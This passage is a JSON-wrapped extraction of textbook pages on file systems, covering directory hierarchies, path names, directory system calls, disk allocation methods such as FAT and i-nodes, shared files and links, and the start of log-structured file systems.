            "content": "4.2.2 Hierarchical Directory Systems\r\nThe single level is adequate for very simple dedicated applications (and was\r\nev en used on the first personal computers), but for modern users with thousands of\r\nfiles, it would be impossible to find anything if all files were in a single directory.\nSEC. 4.2 DIRECTORIES 277\r\nRoot directory\r\nA B C D\r\nFigure 4-6. A single-level directory system containing four files.\r\nConsequently, a way is needed to group related files together. A professor, for ex\u0002ample, might have a collection of files that together form a book that he is writing,\r\na second collection containing student programs submitted for another course, a\r\nthird group containing the code of an advanced compiler-writing system he is\r\nbuilding, a fourth group containing grant proposals, as well as other files for elec\u0002tronic mail, minutes of meetings, papers he is writing, games, and so on.\r\nWhat is needed is a hierarchy (i.e., a tree of directories). With this approach,\r\nthere can be as many directories as are needed to group the files in natural ways.\r\nFurthermore, if multiple users share a common file server, as is the case on many\r\ncompany networks, each user can have a private root directory for his or her own\r\nhierarchy. This approach is shown in Fig. 4-7. Here, the directories A, B, and C\r\ncontained in the root directory each belong to a different user, two of whom have\r\ncreated subdirectories for projects they are working on.\r\nUser\r\ndirectory\r\nUser subdirectories\r\nC C\r\nC\r\nC C\r\nC\r\nB\r\nB\r\nA\r\nA\r\nB\r\nB\r\nC C\r\nC\r\nB\r\nRoot directory\r\nUser file\r\nFigure 4-7. A hierarchical directory system.\r\nThe ability for users to create an arbitrary number of subdirectories provides a\r\npowerful structuring tool for users to organize their work. For this reason, nearly\r\nall modern file systems are organized in this manner."
          },
          "4.2.3 Path Names": {
            "page": 308,
            "content": "4.2.3 Path Names\r\nWhen the file system is organized as a directory tree, some way is needed for\r\nspecifying file names. Two different methods are commonly used. In the first\r\nmethod, each file is given an absolute path name consisting of the path from the\n278 FILE SYSTEMS CHAP. 4\r\nroot directory to the file. As an example, the path /usr/ast/mailbox means that the\r\nroot directory contains a subdirectory usr, which in turn contains a subdirectory\r\nast, which contains the file mailbox. Absolute path names always start at the root\r\ndirectory and are unique. In UNIX the components of the path are separated by /.\r\nIn Windows the separator is \\ . In MULTICS it was >. Thus, the same path name\r\nwould be written as follows in these three systems:\r\nWindows \\usr\\ast\\mailbox\r\nUNIX /usr/ast/mailbox\r\nMULTICS >usr>ast>mailbox\r\nNo matter which character is used, if the first character of the path name is the sep\u0002arator, then the path is absolute.\r\nThe other kind of name is the relative path name. This is used in conjunction\r\nwith the concept of the working directory (also called the current directory). A\r\nuser can designate one directory as the current working directory, in which case all\r\npath names not beginning at the root directory are taken relative to the working di\u0002rectory. For example, if the current working directory is /usr/ast, then the file\r\nwhose absolute path is /usr/ast/mailbox can be referenced simply as mailbox. In\r\nother words, the UNIX command\r\ncp /usr/ast/mailbox /usr/ast/mailbox.bak\r\nand the command\r\ncp mailbox mailbox.bak\r\ndo exactly the same thing if the working directory is /usr/ast. The relative form is\r\noften more convenient, but it does the same thing as the absolute form.\r\nSome programs need to access a specific file without regard to what the work\u0002ing directory is. In that case, they should always use absolute path names. For ex\u0002ample, a spelling checker might need to read /usr/lib/dictionary to do its work. It\r\nshould use the full, absolute path name in this case because it does not know what\r\nthe working directory will be when it is called. The absolute path name will always\r\nwork, no matter what the working directory is.\r\nOf course, if the spelling checker needs a large number of files from /usr/lib,\r\nan alternative approach is for it to issue a system call to change its working direc\u0002tory to /usr/lib, and then use just dictionary as the first parameter to open. By ex\u0002plicitly changing the working directory, it knows for sure where it is in the direc\u0002tory tree, so it can then use relative paths.\r\nEach process has its own working directory, so when it changes its working di\u0002rectory and later exits, no other processes are affected and no traces of the change\r\nare left behind in the file system. In this way, it is always perfectly safe for a proc\u0002ess to change its working directory whenever it finds that to be convenient. On the\r\nother hand, if a library procedure changes the working directory and does not\r\nchange back to where it was when it is finished, the rest of the program may not\nSEC. 4.2 DIRECTORIES 279\r\nwork since its assumption about where it is may now suddenly be invalid. For this\r\nreason, library procedures rarely change the working directory, and when they\r\nmust, they always change it back again before returning.\r\nMost operating systems that support a hierarchical directory system have two\r\nspecial entries in every directory, ‘‘.’’ and ‘‘..’’, generally pronounced ‘‘dot’’ and\r\n‘‘dotdot.’’ Dot refers to the current directory; dotdot refers to its parent (except in\r\nthe root directory, where it refers to itself). To see how these are used, consider the\r\nUNIX file tree of Fig. 4-8. A certain process has /usr/ast as its working directory.\r\nIt can use .. to go higher up the tree. For example, it can copy the file /usr/lib/dic\u0002tionary to its own directory using the command\r\ncp ../lib/dictionary .\r\nThe first path instructs the system to go upward (to the usr directory), then to go\r\ndown to the directory lib to find the file dictionary.\r\nRoot directory\r\nbin etc lib usr\r\nast\r\njim\r\ntmp\r\njim\r\nbin\r\netc\r\nlib\r\nusr\r\ntmp\r\n/\r\nast\r\n/usr/jim\r\nlib\r\nlib\r\ndict.\r\nFigure 4-8. A UNIX directory tree.\r\nThe second argument (dot) names the current directory. When the cp command\r\ngets a directory name (including dot) as its last argument, it copies all the files to\n280 FILE SYSTEMS CHAP. 4\r\nthat directory. Of course, a more normal way to do the copy would be to use the\r\nfull absolute path name of the source file:\r\ncp /usr/lib/dictionary .\r\nHere the use of dot saves the user the trouble of typing dictionary a second time.\r\nNevertheless, typing\r\ncp /usr/lib/dictionary dictionar y\r\nalso works fine, as does\r\ncp /usr/lib/dictionary /usr/ast/dictionar y\r\nAll of these do exactly the same thing."
          },
          "4.2.4 Directory Operations": {
            "page": 311,
            "content": "4.2.4 Directory Operations\r\nThe allowed system calls for managing directories exhibit more variation from\r\nsystem to system than system calls for files. To giv e an impression of what they\r\nare and how they work, we will give a sample (taken from UNIX).\r\n1. Create. A directory is created. It is empty except for dot and dotdot,\r\nwhich are put there automatically by the system (or in a few cases, by\r\nthe mkdir program).\r\n2. Delete. A directory is deleted. Only an empty directory can be delet\u0002ed. A directory containing only dot and dotdot is considered empty\r\nas these cannot be deleted.\r\n3. Opendir. Directories can be read. For example, to list all the files in a\r\ndirectory, a listing program opens the directory to read out the names\r\nof all the files it contains. Before a directory can be read, it must be\r\nopened, analogous to opening and reading a file.\r\n4. Closedir. When a directory has been read, it should be closed to free\r\nup internal table space.\r\n5. Readdir. This call returns the next entry in an open directory. For\u0002merly, it was possible to read directories using the usual read system\r\ncall, but that approach has the disadvantage of forcing the pro\u0002grammer to know and deal with the internal structure of directories.\r\nIn contrast, readdir always returns one entry in a standard format, no\r\nmatter which of the possible directory structures is being used.\r\n6. Rename. In many respects, directories are just like files and can be\r\nrenamed the same way files can be.\r\n7. Link. Linking is a technique that allows a file to appear in more than\r\none directory. This system call specifies an existing file and a path\nSEC. 4.2 DIRECTORIES 281\r\nname, and creates a link from the existing file to the name specified\r\nby the path. In this way, the same file may appear in multiple direc\u0002tories. A link of this kind, which increments the counter in the file’s\r\ni-node (to keep track of the number of directory entries containing the\r\nfile), is sometimes called a hard link.\r\n8. Unlink. A directory entry is removed. If the file being unlinked is\r\nonly present in one directory (the normal case), it is removed from the\r\nfile system. If it is present in multiple directories, only the path name\r\nspecified is removed. The others remain. In UNIX, the system call\r\nfor deleting files (discussed earlier) is, in fact, unlink.\r\nThe above list gives the most important calls, but there are a few others as well, for\r\nexample, for managing the protection information associated with a directory.\r\nA variant on the idea of linking files is the symbolic link. Instead, of having\r\ntwo names point to the same internal data structure representing a file, a name can\r\nbe created that points to a tiny file naming another file. When the first file is used,\r\nfor example, opened, the file system follows the path and finds the name at the end.\r\nThen it starts the lookup process all over using the new name. Symbolic links have\r\nthe advantage that they can cross disk boundaries and even name files on remote\r\ncomputers. Their implementation is somewhat less efficient than hard links though."
          }
        }
      },
      "4.3 FILE-SYSTEM IMPLEMENTATION": {
        "page": 312,
        "children": {
          "4.3.1 File-System Layout": {
            "page": 312,
            "content": "4.3.1 File-System Layout\r\nFile systems are stored on disks. Most disks can be divided up into one or\r\nmore partitions, with independent file systems on each partition. Sector 0 of the\r\ndisk is called the MBR (Master Boot Record) and is used to boot the computer.\r\nThe end of the MBR contains the partition table. This table gives the starting and\r\nending addresses of each partition. One of the partitions in the table is marked as\r\nactive. When the computer is booted, the BIOS reads in and executes the MBR.\r\nThe first thing the MBR program does is locate the active partition, read in its first\r\nblock, which is called the boot block, and execute it. The program in the boot\r\nblock loads the operating system contained in that partition. For uniformity, every\n282 FILE SYSTEMS CHAP. 4\r\npartition starts with a boot block, even if it does not contain a bootable operating\r\nsystem. Besides, it might contain one in the future.\r\nOther than starting with a boot block, the layout of a disk partition varies a lot\r\nfrom file system to file system. Often the file system will contain some of the items\r\nshown in Fig. 4-9. The first one is the superblock. It contains all the key parame\u0002ters about the file system and is read into memory when the computer is booted or\r\nthe file system is first touched. Typical information in the superblock includes a\r\nmagic number to identify the file-system type, the number of blocks in the file sys\u0002tem, and other key administrative information.\r\nEntire disk\r\nPartition table Disk partition\r\nBoot block Superblock Free space mgmt I-nodes Root dir Files and directories\r\n MBR\r\nFigure 4-9. A possible file-system layout.\r\nNext might come information about free blocks in the file system, for example\r\nin the form of a bitmap or a list of pointers. This might be followed by the i-nodes,\r\nan array of data structures, one per file, telling all about the file. After that might\r\ncome the root directory, which contains the top of the file-system tree. Finally, the\r\nremainder of the disk contains all the other directories and files."
          },
          "4.3.2 Implementing Files": {
            "page": 313,
            "content": "4.3.2 Implementing Files\r\nProbably the most important issue in implementing file storage is keeping\r\ntrack of which disk blocks go with which file. Various methods are used in dif\u0002ferent operating systems. In this section, we will examine a few of them.\r\nContiguous Allocation\r\nThe simplest allocation scheme is to store each file as a contiguous run of disk\r\nblocks. Thus on a disk with 1-KB blocks, a 50-KB file would be allocated 50 con\u0002secutive blocks. With 2-KB blocks, it would be allocated 25 consecutive blocks.\r\nWe see an example of contiguous storage allocation in Fig. 4-10(a). Here the\r\nfirst 40 disk blocks are shown, starting with block 0 on the left. Initially, the disk\nSEC. 4.3 FILE-SYSTEM IMPLEMENTATION 283\r\nwas empty. Then a file A, of length four blocks, was written to disk starting at the\r\nbeginning (block 0). After that a six-block file, B, was written starting right after\r\nthe end of file A.\r\nNote that each file begins at the start of a new block, so that if file A was really\r\n3½ blocks, some space is wasted at the end of the last block. In the figure, a total\r\nof seven files are shown, each one starting at the block following the end of the\r\nprevious one. Shading is used just to make it easier to tell the files apart. It has no\r\nactual significance in terms of storage.\r\n…\r\nFile A\r\n(4 blocks)\r\nFile C\r\n(6 blocks)\r\nFile B\r\n(3 blocks)\r\nFile D\r\n(5 blocks)\r\nFile F\r\n(6 blocks)\r\nFile E\r\n(12 blocks)\r\nFile G\r\n(3 blocks)\r\n(a)\r\n…\r\n(File A) (File C)\r\nFile B 5 Free blocks 6 Free blocks\r\n(File E) (File G)\r\n(b)\r\nFigure 4-10. (a) Contiguous allocation of disk space for seven files. (b) The\r\nstate of the disk after files D and F have been removed.\r\nContiguous disk-space allocation has two significant advantages. First, it is\r\nsimple to implement because keeping track of where a file’s blocks are is reduced\r\nto remembering two numbers: the disk address of the first block and the number of\r\nblocks in the file. Given the number of the first block, the number of any other\r\nblock can be found by a simple addition.\r\nSecond, the read performance is excellent because the entire file can be read\r\nfrom the disk in a single operation. Only one seek is needed (to the first block).\r\nAfter that, no more seeks or rotational delays are needed, so data come in at the\r\nfull bandwidth of the disk. Thus contiguous allocation is simple to implement and\r\nhas high performance.\r\nUnfortunately, contiguous allocation also has a very serious drawback: over the\r\ncourse of time, the disk becomes fragmented. To see how this comes about, exam\u0002ine Fig. 4-10(b). Here two files, D and F, hav e been removed. When a file is re\u0002moved, its blocks are naturally freed, leaving a run of free blocks on the disk. The\r\ndisk is not compacted on the spot to squeeze out the hole, since that would involve\r\ncopying all the blocks following the hole, potentially millions of blocks, which\n284 FILE SYSTEMS CHAP. 4\r\nwould take hours or even days with large disks. As a result, the disk ultimately\r\nconsists of files and holes, as illustrated in the figure.\r\nInitially, this fragmentation is not a problem, since each new file can be written\r\nat the end of disk, following the previous one. However, eventually the disk will fill\r\nup and it will become necessary to either compact the disk, which is prohibitively\r\nexpensive, or to reuse the free space in the holes. Reusing the space requires main\u0002taining a list of holes, which is doable. However, when a new file is to be created,\r\nit is necessary to know its final size in order to choose a hole of the correct size to\r\nplace it in.\r\nImagine the consequences of such a design. The user starts a word processor in\r\norder to create a document. The first thing the program asks is how many bytes the\r\nfinal document will be. The question must be answered or the program will not\r\ncontinue. If the number given ultimately proves too small, the program has to ter\u0002minate prematurely because the disk hole is full and there is no place to put the rest\r\nof the file. If the user tries to avoid this problem by giving an unrealistically large\r\nnumber as the final size, say, 1 GB, the editor may be unable to find such a large\r\nhole and announce that the file cannot be created. Of course, the user would be\r\nfree to start the program again and say 500 MB this time, and so on until a suitable\r\nhole was located. Still, this scheme is not likely to lead to happy users.\r\nHowever, there is one situation in which contiguous allocation is feasible and,\r\nin fact, still used: on CD-ROMs. Here all the file sizes are known in advance and\r\nwill never change during subsequent use of the CD-ROM file system.\r\nThe situation with DVDs is a bit more complicated. In principle, a 90-min\r\nmovie could be encoded as a single file of length about 4.5 GB, but the file system\r\nused, UDF (Universal Disk Format), uses a 30-bit number to represent file\r\nlength, which limits files to 1 GB. As a consequence, DVD movies are generally\r\nstored as three or four 1-GB files, each of which is contiguous. These physical\r\npieces of the single logical file (the movie) are called extents.\r\nAs we mentioned in Chap. 1, history often repeats itself in computer science as\r\nnew generations of technology occur. Contiguous allocation was actually used on\r\nmagnetic-disk file systems years ago due to its simplicity and high performance\r\n(user friendliness did not count for much then). Then the idea was dropped due to\r\nthe nuisance of having to specify final file size at file-creation time. But with the\r\nadvent of CD-ROMs, DVDs, Blu-rays, and other write-once optical media, sud\u0002denly contiguous files were a good idea again. It is thus important to study old\r\nsystems and ideas that were conceptually clean and simple because they may be\r\napplicable to future systems in surprising ways.\r\nLinked-List Allocation\r\nThe second method for storing files is to keep each one as a linked list of disk\r\nblocks, as shown in Fig. 4-11. The first word of each block is used as a pointer to\r\nthe next one. The rest of the block is for data.\nSEC. 4.3 FILE-SYSTEM IMPLEMENTATION 285\r\nFile A\r\nPhysical\r\nblock\r\nPhysical\r\nblock\r\n4\r\n0\r\n7 2 10 12\r\nFile\r\nblock\r\n0\r\nFile\r\nblock\r\n1\r\nFile\r\nblock\r\n2\r\nFile\r\nblock\r\n3\r\nFile\r\nblock\r\n4\r\nFile B\r\n0\r\n6 3 11 14\r\nFile\r\nblock\r\n0\r\nFile\r\nblock\r\n1\r\nFile\r\nblock\r\n2\r\nFile\r\nblock\r\n3\r\nFigure 4-11. Storing a file as a linked list of disk blocks.\r\nUnlike contiguous allocation, every disk block can be used in this method. No\r\nspace is lost to disk fragmentation (except for internal fragmentation in the last\r\nblock). Also, it is sufficient for the directory entry to merely store the disk address\r\nof the first block. The rest can be found starting there.\r\nOn the other hand, although reading a file sequentially is straightforward, ran\u0002dom access is extremely slow. To get to block n, the operating system has to start\r\nat the beginning and read the n − 1 blocks prior to it, one at a time. Clearly, doing\r\nso many reads will be painfully slow.\r\nAlso, the amount of data storage in a block is no longer a power of two be\u0002cause the pointer takes up a few bytes. While not fatal, having a peculiar size is\r\nless efficient because many programs read and write in blocks whose size is a pow\u0002er of two. With the first few bytes of each block occupied by a pointer to the next\r\nblock, reads of the full block size require acquiring and concatenating information\r\nfrom two disk blocks, which generates extra overhead due to the copying.\r\nLinked-List Allocation Using a Table in Memory\r\nBoth disadvantages of the linked-list allocation can be eliminated by taking the\r\npointer word from each disk block and putting it in a table in memory. Figure 4-12\r\nshows what the table looks like for the example of Fig. 4-11. In both figures, we\r\nhave two files. File A uses disk blocks 4, 7, 2, 10, and 12, in that order, and file B\r\nuses disk blocks 6, 3, 11, and 14, in that order. Using the table of Fig. 4-12, we can\r\nstart with block 4 and follow the chain all the way to the end. The same can be\r\ndone starting with block 6. Both chains are terminated with a special marker (e.g.,\r\n−1) that is not a valid block number. Such a table in main memory is called a FAT\r\n(File Allocation Table).\n286 FILE SYSTEMS CHAP. 4\r\nPhysical\r\nblock\r\nFile A starts here\r\nFile B starts here\r\nUnused block\r\n0\r\n1\r\n2\r\n3\r\n4\r\n5\r\n6\r\n7\r\n8\r\n9\r\n10\r\n11\r\n12\r\n13\r\n14\r\n15\r\n10\r\n11\r\n7\r\n3\r\n2\r\n12\r\n14\r\n-1\r\n-1\r\nFigure 4-12. Linked-list allocation using a file-allocation table in main memory.\r\nUsing this organization, the entire block is available for data. Furthermore, ran\u0002dom access is much easier. Although the chain must still be followed to find a\r\ngiven offset within the file, the chain is entirely in memory, so it can be followed\r\nwithout making any disk references. Like the previous method, it is sufficient for\r\nthe directory entry to keep a single integer (the starting block number) and still be\r\nable to locate all the blocks, no matter how large the file is.\r\nThe primary disadvantage of this method is that the entire table must be in\r\nmemory all the time to make it work. With a 1-TB disk and a 1-KB block size, the\r\ntable needs 1 billion entries, one for each of the 1 billion disk blocks. Each entry\r\nhas to be a minimum of 3 bytes. For speed in lookup, they should be 4 bytes. Thus\r\nthe table will take up 3 GB or 2.4 GB of main memory all the time, depending on\r\nwhether the system is optimized for space or time. Not wildly practical. Clearly the\r\nFAT idea does not scale well to large disks. It was the original MS-DOS file sys\u0002tem and is still fully supported by all versions of Windows though.\r\nI-nodes\r\nOur last method for keeping track of which blocks belong to which file is to\r\nassociate with each file a data structure called an i-node (index-node), which lists\r\nthe attributes and disk addresses of the file’s blocks. A simple example is depicted\r\nin Fig. 4-13. Given the i-node, it is then possible to find all the blocks of the file.\nSEC. 4.3 FILE-SYSTEM IMPLEMENTATION 287\r\nThe big advantage of this scheme over linked files using an in-memory table is that\r\nthe i-node need be in memory only when the corresponding file is open. If each i\u0002node occupies n bytes and a maximum of k files may be open at once, the total\r\nmemory occupied by the array holding the i-nodes for the open files is only kn\r\nbytes. Only this much space need be reserved in advance.\r\nFile Attributes\r\nAddress of disk block 0\r\nAddress of disk block 1\r\nAddress of disk block 2\r\nAddress of disk block 3\r\nAddress of disk block 4\r\nAddress of disk block 5\r\nAddress of disk block 6\r\nAddress of disk block 7\r\nAddress of block of pointers\r\nDisk block\r\ncontaining\r\nadditional\r\ndisk addresses\r\nFigure 4-13. An example i-node.\r\nThis array is usually far smaller than the space occupied by the file table de\u0002scribed in the previous section. The reason is simple. The table for holding the\r\nlinked list of all disk blocks is proportional in size to the disk itself. If the disk has\r\nn blocks, the table needs n entries. As disks grow larger, this table grows linearly\r\nwith them. In contrast, the i-node scheme requires an array in memory whose size\r\nis proportional to the maximum number of files that may be open at once. It does\r\nnot matter if the disk is 100 GB, 1000 GB, or 10,000 GB.\r\nOne problem with i-nodes is that if each one has room for a fixed number of\r\ndisk addresses, what happens when a file grows beyond this limit? One solution is\r\nto reserve the last disk address not for a data block, but instead for the address of a\r\nblock containing more disk-block addresses, as shown in Fig. 4-13. Even more ad\u0002vanced would be two or more such blocks containing disk addresses or even disk\r\nblocks pointing to other disk blocks full of addresses. We will come back to i\u0002nodes when studying UNIX in Chap. 10. Similarly, the Windows NTFS file sys\u0002tem uses a similar idea, only with bigger i-nodes that can also contain small files.\n288 FILE SYSTEMS CHAP. 4"
          },
          "4.3.3 Implementing Directories": {
            "page": 319,
            "content": "4.3.3 Implementing Directories\r\nBefore a file can be read, it must be opened. When a file is opened, the operat\u0002ing system uses the path name supplied by the user to locate the directory entry on\r\nthe disk. The directory entry provides the information needed to find the disk\r\nblocks. Depending on the system, this information may be the disk address of the\r\nentire file (with contiguous allocation), the number of the first block (both link\u0002ed-list schemes), or the number of the i-node. In all cases, the main function of the\r\ndirectory system is to map the ASCII name of the file onto the information needed\r\nto locate the data.\r\nA closely related issue is where the attributes should be stored. Every file sys\u0002tem maintains various file attributes, such as each file’s owner and creation time,\r\nand they must be stored somewhere. One obvious possibility is to store them di\u0002rectly in the directory entry. Some systems do precisely that. This option is shown\r\nin Fig. 4-14(a). In this simple design, a directory consists of a list of fixed-size en\u0002tries, one per file, containing a (fixed-length) file name, a structure of the file at\u0002tributes, and one or more disk addresses (up to some maximum) telling where the\r\ndisk blocks are.\r\n(a)\r\ngames\r\nmail\r\nnews\r\nwork\r\nattributes\r\nattributes\r\nattributes\r\nattributes\r\nData structure\r\ncontaining the\r\nattributes\r\n(b)\r\ngames\r\nmail\r\nnews\r\nwork\r\nFigure 4-14. (a) A simple directory containing fixed-size entries with the disk addresses\r\nand attributes in the directory entry. (b) A directory in which each entry just\r\nrefers to an i-node.\r\nFor systems that use i-nodes, another possibility for storing the attributes is in\r\nthe i-nodes, rather than in the directory entries. In that case, the directory entry can\r\nbe shorter: just a file name and an i-node number. This approach is illustrated in\r\nFig. 4-14(b). As we shall see later, this method has some advantages over putting\r\nthem in the directory entry.\r\nSo far we have made the assumption that files have short, fixed-length names.\r\nIn MS-DOS files have a 1–8 character base name and an optional extension of 1–3\r\ncharacters. In UNIX Version 7, file names were 1–14 characters, including any ex\u0002tensions. However, nearly all modern operating systems support longer, vari\u0002able-length file names. How can these be implemented?\nSEC. 4.3 FILE-SYSTEM IMPLEMENTATION 289\r\nThe simplest approach is to set a limit on file-name length, typically 255 char\u0002acters, and then use one of the designs of Fig. 4-14 with 255 characters reserved\r\nfor each file name. This approach is simple, but wastes a great deal of directory\r\nspace, since few files have such long names. For efficiency reasons, a different\r\nstructure is desirable.\r\nOne alternative is to giv e up the idea that all directory entries are the same size.\r\nWith this method, each directory entry contains a fixed portion, typically starting\r\nwith the length of the entry, and then followed by data with a fixed format, usually\r\nincluding the owner, creation time, protection information, and other attributes.\r\nThis fixed-length header is followed by the actual file name, however long it may\r\nbe, as shown in Fig. 4-15(a) in big-endian format (e.g., SPARC). In this example\r\nwe have three files, project-budget, personnel, and foo. Each file name is termi\u0002nated by a special character (usually 0), which is represented in the figure by a box\r\nwith a cross in it. To allow each directory entry to begin on a word boundary, each\r\nfile name is filled out to an integral number of words, shown by shaded boxes in\r\nthe figure.\r\nFile 1 entry length\r\nFile 1 attributes\r\nPointer to file 1's name\r\nFile 1 attributes\r\nPointer to file 2's name\r\nFile 2 attributes\r\nPointer to file 3's name\r\nFile 2 entry length\r\nFile 2 attributes\r\nFile 3 entry length\r\nFile 3 attributes\r\np\r\ne\r\nb\r\ne\r\nr\r\nc\r\nu\r\nt\r\no\r\nt\r\nd\r\nj\r\n-\r\ng\r\np\r\ne\r\nb\r\ne\r\nr\r\nc\r\nu\r\nt\r\no\r\nt\r\nd\r\nj\r\n-\r\ng\r\np\r\ne r s o\r\nn n e l\r\nf o o\r\np\r\no\r\nl\r\ne\r\nn\r\nr\r\nn\r\nfoo\r\ns\r\ne\r\nEntry\r\nfor one\r\nfile\r\nHeap\r\nEntry\r\nfor one\r\nfile\r\n(a) (b)\r\nFile 3 attributes\r\nFigure 4-15. Tw o ways of handling long file names in a directory. (a) In-line.\r\n(b) In a heap.\r\nA disadvantage of this method is that when a file is removed, a variable-sized\r\ngap is introduced into the directory into which the next file to be entered may not\r\nfit. This problem is essentially the same one we saw with contiguous disk files,\n290 FILE SYSTEMS CHAP. 4\r\nonly now compacting the directory is feasible because it is entirely in memory. An\u0002other problem is that a single directory entry may span multiple pages, so a page\r\nfault may occur while reading a file name.\r\nAnother way to handle variable-length names is to make the directory entries\r\nthemselves all fixed length and keep the file names together in a heap at the end of\r\nthe directory, as shown in Fig. 4-15(b). This method has the advantage that when\r\nan entry is removed, the next file entered will always fit there. Of course, the heap\r\nmust be managed and page faults can still occur while processing file names. One\r\nminor win here is that there is no longer any real need for file names to begin at\r\nword boundaries, so no filler characters are needed after file names in Fig. 4-15(b)\r\nas they are in Fig. 4-15(a).\r\nIn all of the designs so far, directories are searched linearly from beginning to\r\nend when a file name has to be looked up. For extremely long directories, linear\r\nsearching can be slow. One way to speed up the search is to use a hash table in\r\neach directory. Call the size of the table n. To enter a file name, the name is hashed\r\nonto a value between 0 and n − 1, for example, by dividing it by n and taking the\r\nremainder. Alternatively, the words comprising the file name can be added up and\r\nthis quantity divided by n, or something similar.\r\nEither way, the table entry corresponding to the hash code is inspected. If it is\r\nunused, a pointer is placed there to the file entry. File entries follow the hash table.\r\nIf that slot is already in use, a linked list is constructed, headed at the table entry\r\nand threading through all entries with the same hash value.\r\nLooking up a file follows the same procedure. The file name is hashed to select\r\na hash-table entry. All the entries on the chain headed at that slot are checked to\r\nsee if the file name is present. If the name is not on the chain, the file is not pres\u0002ent in the directory.\r\nUsing a hash table has the advantage of much faster lookup, but the disadvan\u0002tage of more complex administration. It is only really a serious candidate in sys\u0002tems where it is expected that directories will routinely contain hundreds or thou\u0002sands of files.\r\nA different way to speed up searching large directories is to cache the results\r\nof searches. Before starting a search, a check is first made to see if the file name is\r\nin the cache. If so, it can be located immediately. Of course, caching only works\r\nif a relatively small number of files comprise the majority of the lookups."
          },
          "4.3.4 Shared Files": {
            "page": 321,
            "content": "4.3.4 Shared Files\r\nWhen several users are working together on a project, they often need to share\r\nfiles. As a result, it is often convenient for a shared file to appear simultaneously\r\nin different directories belonging to different users. Figure 4-16 shows the file sys\u0002tem of Fig. 4-7 again, only with one of C’s files now present in one of B’s direc\u0002tories as well. The connection between B’s directory and the shared file is called a\nSEC. 4.3 FILE-SYSTEM IMPLEMENTATION 291\r\nlink. The file system itself is now a Directed Acyclic Graph, or DAG, rather than\r\na tree. Having the file system be a DAG complicates maintenance, but such is life.\r\nRoot directory\r\nB\r\nB B C\r\nC C\r\nA C\r\nB C\r\nB\r\n? C C C\r\nA\r\nShared file\r\nFigure 4-16. File system containing a shared file.\r\nSharing files is convenient, but it also introduces some problems. To start\r\nwith, if directories really do contain disk addresses, then a copy of the disk ad\u0002dresses will have to be made in B’s directory when the file is linked. If either B or\r\nC subsequently appends to the file, the new blocks will be listed only in the direc\u0002tory of the user doing the append. The changes will not be visible to the other user,\r\nthus defeating the purpose of sharing.\r\nThis problem can be solved in two ways. In the first solution, disk blocks are\r\nnot listed in directories, but in a little data structure associated with the file itself.\r\nThe directories would then point just to the little data structure. This is the ap\u0002proach used in UNIX (where the little data structure is the i-node).\r\nIn the second solution, B links to one of C’s files by having the system create a\r\nnew file, of type LINK, and entering that file in B’s directory. The new file con\u0002tains just the path name of the file to which it is linked. When B reads from the\r\nlinked file, the operating system sees that the file being read from is of type LINK,\r\nlooks up the name of the file, and reads that file. This approach is called symbolic\r\nlinking, to contrast it with traditional (hard) linking.\r\nEach of these methods has its drawbacks. In the first method, at the moment\r\nthat B links to the shared file, the i-node records the file’s owner as C. Creating a\r\nlink does not change the ownership (see Fig. 4-17), but it does increase the link\r\ncount in the i-node, so the system knows how many directory entries currently\r\npoint to the file.\r\nIf C subsequently tries to remove the file, the system is faced with a problem.\r\nIf it removes the file and clears the i-node, B will have a directory entry pointing to\n292 FILE SYSTEMS CHAP. 4\r\nC's directory B's directory B's directory C's directory\r\nOwner = C\r\nCount = 1\r\nOwner = C\r\nCount = 2\r\nOwner = C\r\nCount = 1\r\n(a) (b) (c)\r\nFigure 4-17. (a) Situation prior to linking. (b) After the link is created. (c) After\r\nthe original owner removes the file.\r\nan invalid i-node. If the i-node is later reassigned to another file, B’s link will\r\npoint to the wrong file. The system can see from the count in the i-node that the\r\nfile is still in use, but there is no easy way for it to find all the directory entries for\r\nthe file, in order to erase them. Pointers to the directories cannot be stored in the i\u0002node because there can be an unlimited number of directories.\r\nThe only thing to do is remove C’s directory entry, but leave the i-node intact,\r\nwith count set to 1, as shown in Fig. 4-17(c). We now hav e a situation in which B\r\nis the only user having a directory entry for a file owned by C. If the system does\r\naccounting or has quotas, C will continue to be billed for the file until B decides to\r\nremove it, if ever, at which time the count goes to 0 and the file is deleted.\r\nWith symbolic links this problem does not arise because only the true owner\r\nhas a pointer to the i-node. Users who have linked to the file just have path names,\r\nnot i-node pointers. When the owner removes the file, it is destroyed. Subsequent\r\nattempts to use the file via a symbolic link will fail when the system is unable to\r\nlocate the file. Removing a symbolic link does not affect the file at all.\r\nThe problem with symbolic links is the extra overhead required. The file con\u0002taining the path must be read, then the path must be parsed and followed, compo\u0002nent by component, until the i-node is reached. All of this activity may require a\r\nconsiderable number of extra disk accesses. Furthermore, an extra i-node is needed\r\nfor each symbolic link, as is an extra disk block to store the path, although if the\r\npath name is short, the system could store it in the i-node itself, as a kind of opti\u0002mization. Symbolic links have the advantage that they can be used to link to files\r\non machines anywhere in the world, by simply providing the network address of\r\nthe machine where the file resides in addition to its path on that machine.\r\nThere is also another problem introduced by links, symbolic or otherwise.\r\nWhen links are allowed, files can have two or more paths. Programs that start at a\r\ngiven directory and find all the files in that directory and its subdirectories will\r\nlocate a linked file multiple times. For example, a program that dumps all the files\nSEC. 4.3 FILE-SYSTEM IMPLEMENTATION 293\r\nin a directory and its subdirectories onto a tape may make multiple copies of a\r\nlinked file. Furthermore, if the tape is then read into another machine, unless the\r\ndump program is clever, the linked file will be copied twice onto the disk, instead\r\nof being linked."
          },
          "4.3.5 Log-Structured File Systems": {
            "page": 324,
            "content": "4.3.5 Log-Structured File Systems\r\nChanges in technology are putting pressure on current file systems. In particu\u0002lar, CPUs keep getting faster, disks are becoming much bigger and cheaper (but not\r\nmuch faster), and memories are growing exponentially in size. The one parameter\r\nthat is not improving by leaps and bounds is disk seek time (except for solid-state\r\ndisks, which have no seek time).\r\nThe combination of these factors means that a performance bottleneck is aris\u0002ing in many file systems. Research done at Berkeley attempted to alleviate this\r\nproblem by designing a completely new kind of file system, LFS (the Log-struc\u0002tured File System). In this section we will briefly describe how LFS works. For a\r\nmore complete treatment, see the original paper on LFS (Rosenblum and Ouster\u0002hout, 1991).\r\nThe idea that drove the LFS design is that as CPUs get faster and RAM memo\u0002ries get larger, disk caches are also increasing rapidly. Consequently, it is now pos\u0002sible to satisfy a very substantial fraction of all read requests directly from the\r\nfile-system cache, with no disk access needed. It follows from this observation\r\nthat in the future, most disk accesses will be writes, so the read-ahead mechanism\r\nused in some file systems to fetch blocks before they are needed no longer gains\r\nmuch performance.\r\nTo make matters worse, in most file systems, writes are done in very small\r\nchunks. Small writes are highly inefficient, since a 50-μsec disk write is often pre\u0002ceded by a 10-msec seek and a 